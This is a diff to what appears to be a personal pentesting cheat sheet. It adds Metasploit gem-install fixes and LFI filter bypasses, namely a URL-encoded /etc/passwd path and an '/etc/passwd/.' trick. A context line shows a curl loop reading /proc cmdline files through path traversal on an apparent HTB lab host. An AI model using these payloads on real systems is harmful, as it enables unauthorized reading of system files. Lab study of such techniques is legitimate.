@@ -1,6 +1,31 @@
 
 #Important commands in future goal
 
+# Fix erro in ruby metasploit 
+#gem missing bundle install 
+
+
+first of download official metasploit github file then 
+
+there are availble gemfile and gemfile.lock 
+
+follow below command : 
+
+sudo apt install gem ; 
+sudo gem install bundle 
+
+sudo bundle install : if error then copy error file example: parse.rb 
+
+type:  sudo gem install parse -v if version 
+
+ then : sudo bundle install 
+
+ then: sudo bundle update 
+
+
+
+# bypass lfi code 
+ %2f%65%74%63%2f%70%61%73%73%77%64%2f%2f%2f%2f%2f. # bypass
 
 # macchanger script top 
 
@@ -1913,6 +1938,9 @@ grep -a -v :$ pid.list | more
 
 for process in $(seq 0 2000); do echo -n "$process"; curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../..//proc/$process/cmdline --output - ; echo ; done  
 
+# bypass lfi /etc/passwd restriction 
+
+ /etc/passwd/.  # this will help to bypass rection 
 
 #magic byte image investigation 
 
